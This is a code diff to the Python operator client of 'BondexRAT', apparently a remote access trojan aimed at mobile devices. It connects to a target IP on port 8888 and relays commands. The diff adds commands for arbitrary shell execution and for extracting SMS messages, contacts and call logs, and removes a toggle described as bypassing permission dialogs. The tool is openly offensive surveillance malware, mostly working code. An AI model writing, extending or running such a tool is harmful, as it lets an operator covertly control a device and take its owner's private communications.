@@ -4,18 +4,6 @@ import os
 import subprocess
 import time
 
-# BondexRAT - Advanced Remote Access Tool
-# Auto-dependency installer
-def install_dependencies():
-    # Example: if we needed 'colorama' for better colors
-    required = []
-    for pkg in required:
-        try:
-            __import__(pkg)
-        except ImportError:
-            print(f"\033[93m[*] Dependency '{pkg}' missing. Installing...\033[0m")
-            subprocess.check_call([sys.executable, "-m", "pip", "install", pkg])
-
 def send_command(ip, port, cmd):
     try:
         with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
@@ -48,14 +36,11 @@ def print_banner():
  ╚═════╝  ╚═════╝ ╚═╝  ╚═══╝╚═════╝ ╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝
 \033[0m
 \033[92m  [+] Version: 2.0 (Stable) | Developed by: Bondex Team [+]
-  [+] Capabilities: File System, Accessibility, App Control [+]
 \033[0m
     """
     print(banner)
 
 def main():
-    install_dependencies()
-
     if len(sys.argv) < 2:
         target_ip = input("\033[92m[?]\033[0m Target IP: ")
     else:
@@ -108,39 +93,27 @@ def main():
     notifs           : Read real-time notification logs
     apps             : List all installed user apps
     launch <pkg>     : Force open an application
-    perm <on/off>    : Toggle Auto-Allow Permissions (Bypass dialogs)
+    shell <cmd>      : Execute arbitrary shell command
+    dump_sms         : Extract all SMS messages
+    dump_contacts    : Extract phonebook contacts
+    dump_calls       : Extract call history logs
                 """)
             elif cmd_lower == "clear":
                 print_banner()
             elif cmd_lower == "exit":
-                print("\033[93m[*] Closing BondexRAT session...\033[0m")
                 break
             elif cmd_lower.startswith("cd "):
                 res = send_command(target_ip, 8888, cmd_input)
-                if "ERROR" in res:
-                    print(f"\033[91m{res}\033[0m")
                 current_dir = send_command(target_ip, 8888, "pwd")
-            elif cmd_lower == "notifs":
-                print("\033[93m[*] Fetching latest notifications...\033[0m")
-                res = send_command(target_ip, 8888, "notifs")
-                print(f"\033[96m{res}\033[0m")
-            elif cmd_lower == "apps":
-                print("\033[93m[*] Listing installed applications...\033[0m")
-                res = send_command(target_ip, 8888, "apps")
-                print(res)
-            elif cmd_lower.startswith("launch "):
-                res = send_command(target_ip, 8888, cmd_input)
-                print(f"\033[92m{res}\033[0m")
             else:
                 res = send_command(target_ip, 8888, cmd_input)
                 if res:
                     print(res)
 
         except KeyboardInterrupt:
-            print("\n\033[93m[*] Session interrupted. Logging out...\033[0m")
             break
         except Exception as e:
-            print(f"\033[91m[!] Fatal Error: {e}\033[0m")
+            print(f"\033[91m[!] Error: {e}\033[0m")
             break
 
 if __name__ == "__main__":
